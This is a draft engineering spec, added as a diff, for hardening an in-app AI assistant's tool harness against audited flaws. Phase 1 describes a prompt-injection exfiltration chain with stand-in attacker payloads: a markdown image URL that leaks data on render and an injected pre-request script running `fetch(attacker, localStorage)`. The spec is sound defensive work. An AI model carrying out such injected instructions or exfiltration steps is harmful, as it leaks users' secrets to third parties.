@@ -1,0 +1,228 @@
+# Relay Harness Hardening (SPEC)
+
+Status: Draft v1 (spec only, no feature code). Branch: feature/ai-agent. Source of every requirement: `agent_docs/relay-harness-audit/REPORT.md` (re-verified 2026-11-08 at HEAD `d88bbc3`). Requirement IDs use the `HH-` prefix plus the report finding ID (`HH-H01` resolves `H-01`, `HH-M00` resolves `M-00`). Ride-along Lows are bundled into the requirement named under "Rides along" and have no ID of their own. Extends `relay-v2`, `relay-polish` and `relay-conversation-polish`; where this spec contradicts them (for example RP-2xx "auto" tool kinds), this spec wins and the contradiction is listed in the requirement.
+
+Line numbers in the report drift. Re-check them before editing.
+
+## 1. Objective
+
+Fix every open High and Medium finding in the audit report (H-01..H-09 and M-00..M-30 except the already-fixed M-08: 9 + 30 = 39 requirements), organised by the report's robustness themes 1-6. Low findings are fixed only when they touch the same code as an in-scope fix.
+
+Users: Relay users in Review and Skip permission modes, and the workspace data Relay mutates.
+
+Why now: the audit was freshly re-verified. The turn lifecycle, the zero-click exfiltration chain (H-02 + H-03 + H-04 + M-04) and Undo fidelity are live risks.
+
+## 2. User decisions (confirmed, encoded exactly)
+
+1. **Risk-based approval, Review mode only.** Risky "auto" calls escalate to an approval card in **Review** mode only: script writes, `shareValues -> true`, `sslVerify -> false`, global base URL and global header-template changes, and downloads (`export_history`, `export_postman`, and any other download tool). **Skip** mode keeps running them without prompting. "Always ask" mode already asks for everything and is unchanged.
+2. **Markdown images are never auto-loaded.** Remote (and any) markdown images render as a plain link needing a click.
+3. **No new auth system, no paid infra.** Reuse the existing guard (`src/lib/relay/server/guard.ts`) on every model route (`/api/ai`, STT, chat). Trust only the platform IP header. Redis stays optional; with no Redis the fallback is a bounded, evicting in-memory counter.
+4. **Breaking tool-surface changes are allowed:** merge or remove overlapping tools, rename fields, load tools by topic. Nothing external depends on tool names. Persisted threads that reference removed tool names must still render (see edge cases, theme 4).
+5. **Phase order:** (1) security/exfiltration, (2) turn lifecycle, (3) undo fidelity, (4) tool surface, (5) metering/robustness.
+6. **`/api/ai` gets the guard only, not the Relay flag.** Inline AI actions (`useAI.ts`, 9 components) run the shared guard machinery: origin check, rate limit, zod, `maxOutputTokens`, and the LLM-key check. They keep working when Relay is disabled, and they use their own `ai:`-prefixed IP-scoped buckets (`RELAY_RATE_LIMIT_MAX` / 600 s and `RELAY_DAILY_MESSAGE_CAP` / day by default), never Relay's `requests`/`turns` budget. BUG-05 ("works when Relay is disabled") is therefore intended behaviour and is not fixed.
+7. **L-02 is narrowed only.** The server sends only the enabled tool set, and REPORT marks L-02 "partially resolved". There is no assistant-turn signing.
+8. **L-13 is out of scope.** The only change is renaming `move_item.toParentId` to `parentId` under HH-M18.
+9. **L-19 is out of scope.** Only the new error codes this epic adds (`step_cap`, the script-secret refusal, the folder-id refusal, `load_tools` first) get en/fr/ja keys.
+
+## 3. Decisions (assumed)
+
+The report offers options and the restate does not decide. The simplest option that satisfies the finding is picked. A reviewer should challenge these first.
+
+| # | Finding | Assumption |
+|---|---------|------------|
+| A1 | H-04 | Keep `shareValues` in `set_relay_preferences` and escalate in Review (decision 1 wins over the report's "remove it" and "approval in every mode"). Skip mode runs it. **Contradiction:** the relay spec's promise 6 says values are shared only when the *user* turns this on; in Skip mode the model can still turn it on. This spec supersedes promise 6 for Skip mode (per the header rule). |
+| A2 | H-03 | Also refuse literal secrets in script text (report's second fix) using the redaction patterns; card shows the full script text, not a diff tool. |
+| A3 | H-05 | Retry and Regenerate become two actions. Retry resends from the last completed tool step. Regenerate, when the turn has applied changes, asks "Undo them / Keep them" (shared with HH-M23). |
+| A4 | H-06 | Capture thread, turn, attachments and `addToolOutput` at `onToolCall` time. Thread switching is not blocked. |
+| A5 | H-07 | Request writes patch a clean open tab (no "changed outside the editor" state is needed: a clean tab is always patchable). A dirty tab routes the edit through the existing dirty-tab confirm gate (`registerConfirmGate`, `tabs.ts`), shown in **every** mode like HH-M07: `save-all` saves the tab's edits first, then applies the Relay edit and patches the tab; `discard` drops the tab's edits, then applies (values from `CLOSE_DECISIONS`); declining the card leaves request and tab untouched. |
+| A6 | H-08 | Two counters, both IP-scoped, using the shared limiter: **`requests`** (every model request, user turn or continuation, charged weight 1 *before parsing* — this is also HH-M30's cheap burst limit) with `RELAY_REQUEST_RATE_MAX = RELAY_RATE_LIMIT_MAX * RELAY_MAX_STEPS` (360 / 600 s) and `RELAY_DAILY_REQUEST_CAP = RELAY_DAILY_MESSAGE_CAP * RELAY_MAX_STEPS` (3,600 / day); and **`turns`** (user-last requests only, today's `RELAY_RATE_LIMIT_MAX` 30 / 600 s and `RELAY_DAILY_MESSAGE_CAP` 300 / day). The daily caps always key on IP; `x-relay-user` may add a second scope but never replaces or resets the IP scope. Trusted IP = one named constant `TRUSTED_IP_HEADER = "x-real-ip"`; `x-forwarded-for` is never read. Evidence: the app deploys on Vercel (`package.json` homepage `requestr-api.vercel.app`), which sets `x-real-ip` itself and overwrites client-sent forwarding headers (Vercel request-headers docs; not re-fetched in this audit, re-confirm before Phase 5). Self-hosting must set the header at its proxy; this goes in the README env notes and `agent_docs/polish-and-landing/legal-checklist.md` row 7 (which still cites `x-forwarded-for`). A missing Origin is accepted only when `Sec-Fetch-Site` is `same-origin`; this is a browser signal, not a security boundary — the meters are the enforcement. The server no longer derives a step cap from client `step-start` parts or any client-supplied turn id (a stateless server has no trusted turn identity); the `requests` meter bounds spend, and `RELAY_MAX_STEPS` stays a client UX cap. |
+| A7 | M-28 | On Redis error, fall back to the bounded in-memory counter and log with context (fail-open to local limits, not to unlimited). Guard errors never surface as an uncaught 500: they return a relay JSON error code. Expiry is set atomically (`SET key 1 EX n NX`). |
+| A8 | M-29 | With no shared counter in production: log loudly once, keep the bounded fallback (no fail-closed, no new infra). Cap = `RELAY_MAX_RATE_KEYS` (10,000) with a sweep of expired entries on every insert past the cap; if still full, evict the oldest-inserted key (Map order). Header values used in keys capped at 128 chars (`RELAY_MAX_SCOPE_CHARS`). |
+| A9 | M-17 | Use `.nullish()` on the chain fields, not `experimental_repairToolCall`. |
+| A10 | M-16 | Allow independent calls in one step (prompt wording), no new batch tool. Parallel calls in one step count as one step. |
+| A11 | M-03 | Core set always on, topic groups chosen from the slash command, attachment kinds, and a core `load_tools{topic}` tool that enables a group for the rest of the turn. Topics derive from the existing capability categories. |
+| A12 | M-18 | Keep `delete_requests`, drop `delete_request` (also from `src/lib/relay/capabilities.ts:107,166`; its en/fr/ja labels in `relayDock.json` stay so old threads render); `create_collection` loses `parentId`; collection tools accept collection ids only; every destination-parent input is named `parentId` (including `move_item.toParentId`). |
+| A13 | M-19 | Drop `graphql` from the relay tool `BODY_TYPES` in `src/lib/relay/tools/schemas.ts` (not `src/lib/shareLink.ts`, which has its own list) instead of implementing wrapping. Checked: the store has no GraphQL body type (`requestWrite.ts:46-55` maps it to `json`); GraphQL is a tab type served by `create_graphql_request` / `update_tab_request`, so no shipped feature loses anything. |
+| A14 | M-02 | The read vocabulary (`form-data`, `xml`, `html`, `api-key`, `key`, `value`) becomes the single shared vocabulary for reads and writes. |
+| A15 | M-06 | Drop the no-op `proxyUrl` from the `update_proxy_settings` tool instead of wiring it (wiring needs upstream-proxy support in `/api/proxy`, which reads no `proxyUrl` today). The Settings UI field (`ProxySection.tsx`) and `useSettingsStore.proxyUrl` stay untouched. |
+| A16 | M-07 | Placed in theme 2 (approval/gating) because the fix is to register the existing dirty-tab confirm gate on delete tools. |
+| A17 | M-24 | Placed in theme 1 (lifecycle/state sync). Fix: `storage` event listener rehydrating mode and `enabled`. |
+| A18 | M-26 | Placed in theme 5 with M-03 (token cost). Fix (client `contextBuilder`/`tokenBudget`): once the current turn holds more than `RELAY_KEEP_TOOL_RESULTS` (6) tool results, older outputs are replaced by a stub that keeps the `toolCallId`, tool name and part state (so call/result pairing stays valid); pending or awaiting-approval parts are never stubbed. |
+| A19 | M-09, M-10 | M-09 sits in theme 4 (catalog), M-10 in theme 3 (Undo/partial writes). M-10 is all-or-nothing validation. |
+| A20 | M-21 | Throttled partial save every 2 s while streaming, plus flush on thread switch and `pagehide`. |
+| A21 | M-22 | Persist a "running" marker when an approved call starts; restore settles it as "interrupted, may have applied" with a link to the change log. |
+| A22 | Redis | `SET key 1 EX n NX`, then `INCR` only when the SET did not apply (INCR keeps the TTL), for every counter key; no Lua script. The `RateLimitCounter` interface gains one atomic `incrWithExpiry(key, sec)` implemented by the local Redis, Upstash and memory counters. |
+| A23 | M-25 | STT runs flag + origin + Content-Length + the `requests` meter, but not `isRelayConfigured` (that checks the LLM key, which STT does not use). (`/api/ai` is user decision 6, not an assumption.) |
+
+## 4. Tech stack, commands, structure
+
+Next.js 16 App Router, React, Zustand 5 (`src/stores`), AI SDK `useChat` (`UIMessage.parts`), zod, next-intl (en/fr/ja), Vitest, Playwright. Package manager is `bun`; never `npm`. Never run the dev server (always running). No tests under `src/components/reactbits/`.
+
+- Unit: `bunx vitest run <paths>` (specs beside source; touched files keep >= 80% coverage)
+- E2E (targeted only): `bunx playwright test e2e/qa/relay-harness-hardening/<spec>.spec.ts` (headless, seeded QA data). Visual checks use headless agent-browser with the seed `--init-script` and a repo-named session.
+- Types: `bunx tsc --noEmit` once, after the full task; Lint: `bunx biome check <files>`
+
+Touched areas: `src/hooks/useRelayChat.ts`, `src/hooks/useAI.ts`, `src/lib/relay/capabilities.ts`, `src/lib/relay/slashCommands.ts`, `src/components/relay/*`, `src/lib/relay/tools/*`, `src/lib/relay/changeLog.ts`, `src/lib/relay/redact.ts`, `src/lib/relay/server/*`, `src/lib/relay/fence.ts` (new), `src/lib/hub.ts`, `src/lib/redis.ts`, `src/hooks/useSaveRequest.ts`, `src/app/api/{ai,relay/chat,relay/stt}/route.ts`, `src/stores/useCollectionsStore.ts`, `useTabsStore.ts`, `useRelayPermissionStore.ts`, `useRelayStore.ts`, `messages/*/relayDock.json`.
+
+Code style: constants over magic numbers (`RELAY_MAX_STEPS`, new `RELAY_PARTIAL_SAVE_MS`, `RELAY_MAX_RATE_KEYS`, `RELAY_MAX_SCOPE_CHARS`, `RELAY_KEEP_TOOL_RESULTS`, `RELAY_REQUEST_RATE_MAX`, `RELAY_DAILY_REQUEST_CAP`, `TRUSTED_IP_HEADER`); functions under ~30 lines; fail fast; no silent catches; new cross-cutting state lives in `src/stores/use<Name>Store.ts`.
+
+## 5. Testing strategy
+
+- Every requirement, and every ride-along Low marked resolved, ships at least one regression test that fails on the pre-fix code (unit/spec for logic, Playwright for visible behaviour: Stop, Retry, thread switch, Undo, approval cards, image rendering).
+- Undo requirements (theme 3) share one **property test**: write -> undo -> deep-equals the store snapshot, run over every write tool.
+- Server requirements (theme 6) test the guard and routes directly with a fake counter (Redis rejecting, `expire` failing, missing/forged headers, oversized bodies).
+- Redaction requirements extend `redact.corpus.ts`.
+- Every new UI string exists in en, fr and ja with ICU placeholders intact.
+
+## 6. Boundaries
+
+- Always: write the failing regression test first; run targeted tests per requirement; keep Skip mode behaviour unchanged unless a requirement says otherwise; update locale files together.
+- Ask first: any new dependency; any new route; changes to the AI SDK version; changing what is persisted in IndexedDB beyond the fields named here.
+- Never: add a new auth system or paid infra; relax approval in Always-ask mode; render remote images; let a Relay tool change its own permission mode; run `npm`; commit without being told to.
+
+## 7. Requirements
+
+Phase order below is the delivery order. Each requirement: Problem, Required behaviour, Acceptance criteria (AC, all testable), Rides along.
+
+### Phase 1: Security and exfiltration (theme 2 plus H-02 and M-04)
+
+Shared foundation **HH-RISK**: a `risk(name, input, ctx)` layer in the tool registry returning `"low" | "escalate"` (`ctx` is read-only current settings; only HH-M05 needs it, because `set_global_variables.headers` is a full replacement list and "removal stays auto" needs a diff against current `globalHeaders`). When the permission mode is **Review** and `risk` is `escalate`, an `auto` call is held for an approval card exactly as a `confirm` call. In Skip mode `risk` is ignored. In Always-ask mode nothing changes. AC: unit tests cover all three modes for one escalating and one non-escalating input; a mode flip while a card is pending still records the decision per call.
+
+**HH-H02 Markdown images load on their own.** Problem: `![](https://attacker/?d=...)` fires a request when the reply renders. Required: `RelayMarkdown` overrides `img` so no `<img>` is ever rendered; it renders the alt text (or the URL when alt is empty) as a plain link that needs a click, with `rel="noopener noreferrer"` and `target="_blank"`, only when `allowRelayUrl` accepts the URL; otherwise it renders the alt text as plain text with no link. AC: spec asserts markdown image syntax (https, http, data:, relative, empty alt) produces zero `img` elements; https/http give one link, `data:`/`javascript:` give plain text and no link; Playwright asserts no network request to the image URL on render. Optional hardening (not required for done): CSP `img-src 'self' data:`.
+
+**HH-H03 Script writes are auto and run via `new Function`.** Problem: injected instructions store `fetch(attacker, localStorage)` as a pre-request script that runs on the next Send. Required: `set_request_scripts` escalates in Review with the card showing the full script text; literal secrets in script text are refused; the tool description no longer claims scripts are never run. AC: Review mode shows a card and does not write until approved; Skip mode writes without a card; a script containing a token-shaped literal is refused with a coded error; description text asserted. Rides along: L-01 only as far as the description (mode awareness goes with HH-M27).
+
+**HH-H04 Model can turn on "Share variable values".** Problem: `set_relay_preferences{shareValues:true}` is auto and takes effect on the next read in the same turn. Required: `shareValues -> true` escalates in Review; `-> false` stays auto; `enabled:false` behaviour unchanged. AC: Review shows a card for true and none for false; denying leaves the preference false and the next `get_environment` still masks values; Skip mode applies it.
+
+**HH-M04 Redaction gaps.** Problem: `Authorization: Token ...`, lowercase `basic`, `sk_test_/sk_live_`, `glpat-` and `?key=`/`access_key` inside `redactDeep` leak; `curl -u sk_test_...:` stores the key as a literal. Required: all listed formats redacted in `redactValue` and `redactDeep`, scripts included; a token-shaped basic-auth username is treated as a secret and never echoed back by `buildCurl`. AC: each format added to `redact.corpus.ts` and a round-trip test `import_curl -> export_curl` shows the username masked.
+
+**HH-M05 Global base URL, headers and send target.** Problem: base URL and global headers are auto and unvalidated; the send card host ignores the base URL; `send_request` refuses relative URLs. Required: one `resolveSendTarget()` used by both the send card and the send itself; `baseUrl` validated with `urlProblem`; base URL changes and any add or value change of a global (default) header escalate in Review (decision 1 says "header-template changes"; the Settings UI calls these "Default headers", added to every request, so no `{{...}}`-only narrowing); removing a header stays auto; relative URLs resolve against the base URL before the scheme check. AC: card host equals the real destination host; relative URL sends succeed when a base URL is set and fail with a coded error when not; invalid base URL rejected; Review escalation per HH-RISK.
+
+**HH-M06 TLS off is auto; `proxyUrl` is a no-op.** Required: `sslVerify -> false` escalates in Review (true stays auto); `proxyUrl` is removed from the tool schema (A15). AC: Review card for false, none for true; the tool's JSON schema no longer contains `proxyUrl` and a call that passes it fails zod; undo of a change-log entry recorded before the fix (with `proxyUrl` in its snapshot, `changeLog.ts` `PROXY_KEYS`) still restores `proxyUrl`; the Settings proxy field is unaffected.
+
+**HH-M07 Skip mode with a dirty tab.** Problem: deleting a request whose tab is dirty can never succeed in skip mode. Required: the dirty-tab confirm gate is registered on the delete tools and shows in every mode (RP-221). AC: in Skip mode, deleting a request with a dirty tab shows the gate and succeeds after confirm; declining leaves the request and tab untouched.
+
+Phase 1 also bundles (with their parent): **L-07** `redactEnvironment` and `describeEnvironment` return one shape, derived from one function (parent: HH-H04, same `redact.ts`/`workspaceRead.ts` env path as its masking AC; AC: both return deep-equal shapes for one env). **L-05** downloads (`export_history`, `export_postman`) escalate in Review via HH-RISK (parent: HH-RISK; AC: card in Review, none in Skip). **L-04** `diff_responses` and WebSocket message output wrapped in the shared response fence with delimiter stripping (parent: HH-M15, which edits `tabRequests.ts` (`get_tab_request`, next to the WebSocket output) and adds `list_history`, whose positions `diff_responses` takes; AC: forged fence token in a diff or WebSocket message is stripped). **L-24** attachment detail fence strips both tokens from every resolved section by reusing `stripDelimiters` (parent: HH-H06/HH-M03, which capture attachments and pick topics from attachment kinds via `src/lib/relay/attachments.ts`; AC: attachment name containing the close token cannot terminate the fence).
+
+Phase 1 edge cases: a single turn containing several escalating calls shows one card each, none run before approval; an escalating call in an `export_backup`-style confirm path is not double-prompted; `shareValues` toggled twice in one turn; image markdown inside code blocks stays literal code; links produced from images carry the same URL allow-list as normal links (`allowRelayUrl`); a script write with an unchanged script still escalates (no diffing shortcut).
+
+### Phase 2: Turn lifecycle (theme 1)
+
+Shared foundation **HH-TURN**: an explicit turn state (`idle -> streaming -> awaiting-user -> running-tools -> stopped | capped | errored`) in a Zustand store (`src/stores/useRelayTurnStore.ts`), and every queued tool is bound at `onToolCall` time to `{threadId, turnId, attachments, addToolOutput, AbortController}`. AC: unit tests for each legal transition; illegal transitions are rejected.
+
+**HH-H01 Stop does not end the turn.** Problem: after Stop, a returning tool output makes the SDK auto-submit and the loop continues. Required: a `stopped` state set by Stop and cleared only on a new send or Retry/Regenerate; `sendAutomaticallyWhen` returns false while stopped; late tool outputs from stopped tools are still recorded but trigger no new request. AC: spec counts fetches after Stop during an approved `run_chain` (zero new requests); the existing spec that mocks the follow-up turn is replaced.
+
+**HH-H05 Retry/Regenerate replays the whole turn.** Problem: `regenerate()` drops finished tool steps, so writes duplicate. Required: Retry resends from the last completed tool step without dropping finished tool parts; Regenerate with applied changes follows HH-M23. AC: three `create_request` calls succeed, step 4 errors, Retry produces no extra requests (store holds exactly 3 new requests). Rides along: L-23 (a step-cap rejection returns a distinct `step_cap` code with a "Continue" action instead of Retry).
+
+**HH-H06 Thread switch mid-run misroutes writes.** Required: tools write, attribute changes and deliver outputs to the thread and turn captured at call time; the change log records the captured turn id. AC: switch threads while a tool is queued; the change appears in the original thread's Changes bar, its output lands in the original thread, and "Undo all" in the new thread does not revert it.
+
+**HH-M01 Auto tools can't be aborted.** Required: every queued call gets an AbortController passed to the tool; running auto tools count toward `approvedRunning`; the composer shows Stop while any is running. AC: in Skip mode, Stop during `send_request` aborts the fetch and the composer shows Stop throughout.
+
+**HH-M20 Send while an auto tool runs.** Required: Send is disabled while queued tools are pending (the composer shows Stop instead). AC: no path calls `sendMessage` with a pending tool; the late result and ChangeCard are never lost, asserted in a spec.
+
+**HH-M21 Partial reply lost.** Required per A20. AC: killing the page mid-stream (simulated `pagehide`) and switching threads mid-stream both reload with the partial reply marked Interrupted. Rides along: L-26 (a failed save keeps its pending entry until a write succeeds and surfaces a "not saved" state after 3 failures), L-16 (version/`updatedAt` compare before a write so two tabs on one thread do not overwrite each other).
+
+**HH-M22 Ran but shown as declined.** Required per A21. AC: reload during an approved confirm-kind call settles it as "interrupted, may have applied" with a change-log link, never "Declined automatically". Rides along: L-03 (auto tools without results settle as interrupted instead of spinning forever; the model is told the outcome is unknown), L-18 (declining `import_backup` shows Declined, not Failed: treat both cancel errors as declined).
+
+**HH-M23 Discarded turns keep their writes.** Required: before Regenerate or Edit & resend cuts a turn that has applied changes, show them with "Undo them" or "Keep them"; Keep re-keys the changes to the new turn id. AC: Regenerate path keeps count of the Changes bar equal to the changes "Undo all" reverts; Edit & resend path leaves no orphan changes without an Undo entry point. Rides along: L-21 (the Changes bar counts `changeIds`, not just `changeId`, and R4 grouping uses the same count).
+
+**HH-M24 No cross-tab sync.** Required per A17. AC: tightening the mode or disabling Relay in tab A is reflected in tab B before tab B's next tool call (simulated `storage` event). Rides along: L-10 (pending "turn Relay off after this reply" persisted with the thread).
+
+Phase 2 edge cases: Retry when the error came before any tool step (behaves as a plain resend, nothing to keep); a thread deleted while one of its tools is queued (the change is still logged under the captured turn and stays undoable from the change log; the output is dropped, no crash); Stop pressed with zero tools running; Stop during an awaiting-user approval card; Stop then immediately Send; two tools queued, thread switch, the first finishes after the switch; Retry after a `capped` or `stopped` turn; tab closed between approval click and tool start; a tool aborted by Stop still records an honest "aborted" change-log state (no half-applied write is reported as success).
+
+### Phase 3: Undo fidelity (theme 3)
+
+Shared foundation **HH-UNDO**: each entity adapter declares its dependents (chain <-> collection, active environment, open tabs) and a shared property test runs write -> undo -> deep-equal for every write tool. Rides along (bundled with the contract): **L-15** undo is all-or-nothing with a status recorded on the change, "Undo unavailable" shown when IndexedDB is missing, and closed tab ids stored in the delete snapshot so Undo reopens them. **L-14** restoring a tab-only edit restores `isDirty` with the snapshot. AC: property test passes for all tools; a throwing undo leaves the store unchanged.
+
+**HH-H07 Relay edits to an open request lost on Save.** Required per A5. AC: Relay edits URL of a clean open request; the tab shows the new URL, stays clean, and Save keeps it; with a dirty tab the gate appears in Review **and Skip**: `save-all` keeps the tab's edits plus the Relay edit, discard keeps only the Relay edit, decline leaves both untouched; Undo still works afterwards (no false conflict) and also restores the tab.
+
+**HH-H09 Undo of `delete_collection` loses its chain.** Required: `captureTree` includes the collection's chain and restore re-creates it. AC: delete then undo deep-equals the pre-delete store including the chain.
+
+**HH-M10 Partial multi-delete.** Required per A19: all ids validated before any delete; on failure nothing is deleted and the full error is returned. AC: a list with one bad id deletes nothing and reports that id.
+
+**HH-M11 `import_backup` has no Undo.** Required: record the merged entity ids as one change with an adapter entry; the card and "Undo all" cover it. AC: import then Undo removes exactly the merged entities and restores overwritten ones.
+
+**HH-M12 Chain duplicates.** Required: chain copies are `standalone` (R1) with no collection link duplicated; `duplicate_collection` copies the chain. AC: copy appears in chain list and search; collection still has one chain; duplicated collection has its own chain.
+
+**HH-M13 Undo of `delete_environment` leaves none active.** Required: snapshot `wasActive`; undo calls `setActive`. AC: delete active env, undo, same env active. Rides along: L-09 (active-environment changes get their own `action` instead of inferring "created" from `before === null`).
+
+**HH-M14 Assertions dropped on save.** Required: "Save all & close" and the dirty-gate save use the same function as `useSaveRequest`. AC: a tab with assertions saved through each path retains them.
+
+Phase 3 edge cases: delete a collection that has a chain and open tabs; undo after the request was edited later (conflict message stays); delete the only/active environment; import a backup that overwrites an existing id; undo of a chain duplicate; IndexedDB unavailable at write time; undo run twice (idempotent, second is a no-op with status).
+
+### Phase 4: Tool surface and token cost (themes 4 and 5)
+
+**HH-M00 Catalog slug must be guessed.** Required: new read tool `list_api_catalog` (search/paged) returning valid slugs from the hub index; `import_api_catalog` validates the slug before the approval card shows. AC: unknown slug fails before any card; `list_api_catalog` result slugs all import. Rides along: L-06 (generic `validate(input)` step before cards for id-bearing tools: unknown ids fail fast and cards never preview "Delete 0").
+
+**HH-M02 Read and write shapes differ.** Required per A14; `xml` and `html` bodies become writable. AC: round trip read -> write -> read for each body type and auth type is identical. Rides along: L-22, partial (`update_tab_request` mentions both `tabId` sources; `open_page.section` rejected for non-settings pages; the system prompt lists the remaining parity gaps — accent colour, timeout/SSL/redirect writes, pin, saving GraphQL — as limitations). The folder pill and `get_workspace_summary` sub-items stay open; REPORT marks L-22 "partially resolved".
+
+**HH-M09 Catalog import differs from the Hub UI.** Required: reuse the Hub import function; refuse already-imported slugs; one commit so it cannot fail half-written. AC: importing twice is refused with a clear error; a forced failure after the collection leaves no collection behind.
+
+**HH-M15 Read-after-write gaps.** Required: `get_request` returns assertions, timeout, SSL and redirects; `get_tab_request` reads HTTP tabs; new `list_history`; folders included in search. AC: each of the four asserted in tool specs; `generate_tests` output verifiable via `get_tab_request`.
+
+**HH-M16 Batch limits.** Required per A10. AC: system prompt no longer says "one logical change at a time"; a step with N parallel `create_request` calls counts as one step; a 15-request build fits in the 12-step cap in a scripted run.
+
+**HH-M17 Nullable but required fields.** Required per A9. AC: `add_chain_node` accepts input with nullable keys omitted; the JSON schema marks them optional.
+
+**HH-M18 Overlapping tools.** Required per A12. AC: registry lists no overlapping pair; renamed `parentId` is accepted everywhere; collection tools reject folder ids with a coded error that names the folder tool.
+
+**HH-M19 GraphQL body type.** Required per A13. AC: the relay `BODY_TYPES` in `schemas.ts` has no `graphql` and `set_request_body{type:"graphql"}` fails zod; the description no longer promises wrapping and points GraphQL to `create_graphql_request`; a persisted thread whose tool input has `type:"graphql"` still renders.
+
+**HH-M03 All tools on every step.** Required per A11. AC: measured tool-payload characters for a plain turn <= 20,000 (from 48,132); a slash command and an attachment kind each add only their group; `load_tools` enables a group for the rest of the turn; an unknown topic is rejected by zod; no tool disappears while it has a pending result; the server computes the enabled set (core + slash-command topic + attachment-kind topics + `load_tools` calls in the current turn) and sends only those tools, asserted on the route. Rides along: L-02, **narrowed only** (server-side tool narrowing; it does not stop a direct caller who fabricates history or calls `load_tools`; REPORT marks L-02 "partially resolved"; decision 7). L-20 (`/run` description reworded to match `requiresTarget: "request"`, same `slashCommands.ts` HH-M03 reads topics from; AC: description string asserted).
+
+**HH-M26 Current turn never trimmed.** Required per A18. AC: after 8 tool results the earliest are stubs in the next request body; a 12-step loop stays under the `context_too_long` cap in a scripted test; the latest 6 results are untouched.
+
+**HH-M27 Scope list omits history and tabs.** Required: the scope list is generated from the tool categories so it cannot drift from the registry. AC: a test fails if a category is missing from the prompt; "export my history" is in scope. Rides along: L-01 (the per-request context states the permission mode, and tool descriptions stop promising a card in all modes).
+
+Phase 4 edge cases: persisted threads containing removed tool names (`delete_request`, `proxyUrl`) render read-only without errors; an enabled topic group spanning a Retry; the model calling a tool outside the enabled set returns a coded "load_tools first" error (not a crash); slug list larger than one page; catalog slug already imported under a different name; locale labels exist for every new or renamed tool in en/fr/ja; the tool consistency matrix (implementation, capability category, en/fr/ja labels) passes for every registered tool, with no hard-coded tool count (tools are added: `list_api_catalog`, `list_history`, `load_tools`; and removed: `delete_request`).
+
+### Phase 5: Server metering and robustness (theme 6)
+
+**HH-H08 Model spend bypass; `/api/ai` unguarded.** Required per A6 and decision 6. `/api/ai` runs the shared guard machinery (origin, its own `ai:` rate and daily limits, zod validation, `maxOutputTokens`, LLM-key check) without the Relay flag check and without Relay's budget. AC: direct calls with a rotated `x-relay-user` (IP daily cap still trips), a spoofed `x-forwarded-for` (ignored, bucket follows `x-real-ip`), no Origin and no `Sec-Fetch-Site: same-origin` (rejected), an omitted `step-start`, or an assistant-last message (each charged to `requests`) are all metered or rejected; the 361st request in a window is refused with `rate_limited`; `/api/ai` returns the relay error code for a cross-origin Origin, an invalid body (zod) or its own limit reached, and passes `maxOutputTokens`; with the Relay flag off `/api/ai` still succeeds; exhausting `/api/ai`'s limit does not limit Relay chat, and the reverse holds too; tests cover each bypass named in the report. Rides along: L-02, narrowed only (decision 7, shared with HH-M03).
+
+**HH-M28 Redis connect failure cached; guard errors unhandled.** Required per A7 and A22: reset `clientPromise` on rejection; guard wrapped so errors return a relay code; atomic expiry. AC: rejecting connect then recovering works on the next call; `incr`/`expire`/`ttl` throwing returns a coded error or falls back, never an uncaught 500; no key without TTL after a failed `expire`.
+
+**HH-M29 In-memory fallback grows without bound.** Required per A8. AC: inserting 20,000 distinct keys leaves <= 10,000 entries; expired entries are swept without a re-read; when full of live keys the oldest is evicted; a 1 KB header value is truncated to 128 chars in the key; production without a shared counter logs once per process.
+
+**HH-M30 Unmetered work before the guard.** Required: check `Content-Length` first, stream-limit the body to the existing 256 KB cap, and charge the `requests` meter (A6) before JSON parse, zod and secret scans. AC: oversize body rejected without being fully read (a stream that would exceed the cap is cancelled); a chunked body with no `Content-Length` is still capped; a burst of invalid bodies is rate-limited.
+
+**HH-M25 STT route.** Required per A23: shared guard (minus the LLM-key check) and the `requests` meter, `Content-Length` check before `formData()`, size check retained. AC: oversize and over-rate requests rejected before buffering. Rides along: L-25 (upstream `fetch` has `AbortSignal.timeout(...)` plus `req.signal`; an abort maps to `unavailable`).
+
+Phase 5 edge cases: users behind one NAT/office IP share the IP daily caps (accepted, as the report recommends; documented); Redis down at boot; Redis flapping; chunked requests with no `Content-Length`; multiple IPs in `x-forwarded-for` (ignored, only the trusted header is read); IPv6; missing trusted header (local dev: single `unknown` bucket, logged once per process, not per request); metering counts a request that later fails upstream; flag turned off mid-session.
+
+## 8. Success definition
+
+Done means all of:
+1. All 39 requirements pass their acceptance criteria.
+2. Each finding has a named regression test (unit or e2e) that fails on the pre-fix code; the test file is listed in the finding's row of REPORT.md.
+3. `agent_docs/relay-harness-audit/REPORT.md` gains a "Resolved in relay-harness-hardening" column/marker per in-scope finding (finding ID, requirement ID, commit, test file). Ride-along Lows are marked resolved too; L-02 and L-22 are marked "partially resolved" with the open sub-items named.
+4. `bunx tsc --noEmit` and `bunx biome check` clean on touched files; the targeted e2e specs for Stop, Retry, thread switch, Undo, approval cards and image rendering pass as headless seeded Playwright specs (`e2e/qa/relay-harness-hardening/`); agent-browser is only for proof screenshots.
+5. Skip mode behaviour is unchanged except where this spec says so (undo, lifecycle and server fixes still apply).
+
+## 9. Out of scope
+
+- Theme 7 (live-model eval set).
+- Lows that do not touch in-scope code: L-11 (`smart.ts` import default, only ride-along code there), L-13 (`move_item` UI parity: its fix is a new tree UI or tool removal; HH-M18 only renames its input; decision 8), L-17 (`timing.ts`), L-19 (ToolRow error i18n; only the new error codes this spec adds get en/fr/ja keys; decision 9).
+- Remaining L-02 and L-22 sub-items (see HH-M03, HH-M02).
+- The Settings UI "Proxy URL" field is itself a no-op (`/api/proxy` never reads it); not a Relay finding.
+- Fixed items: M-08, L-08. L-12 (did not hold).
+- Everything in the report's "Out of scope and deliberately not flagged": streaming STT, LLM provider choice, cloud sync, backup encryption, scheduled backups, Relay changing its own approval mode or wiping data, test-suite quality.
+- A new auth system, paid infra, a mandatory Redis, or fail-closed deployments.
+- Escalation of risky calls in Skip mode.
+- Changes to the build-phases/e2e dev workflow.
+
+## 10. Open questions
+
+None. Q1-Q4 were answered by the user and are recorded as decisions 6-9. Reviewers should still confirm A1-A23, especially A6 (meter limits and the Vercel `x-real-ip` dependency) and A11 (topic loading).
+
+## Appendix: coverage matrix
+
+| Phase | Requirements | Rides along |
+|-------|--------------|-------------|
+| 1 | H02, H03, H04, M04, M05, M06, M07 (+HH-RISK) | L-01 (part), L-04, L-05, L-07, L-24 |
+| 2 | H01, H05, H06, M01, M20, M21, M22, M23, M24 (+HH-TURN) | L-03, L-10, L-16, L-18, L-21, L-23, L-26 |
+| 3 | H07, H09, M10, M11, M12, M13, M14 (+HH-UNDO) | L-09, L-14, L-15 |
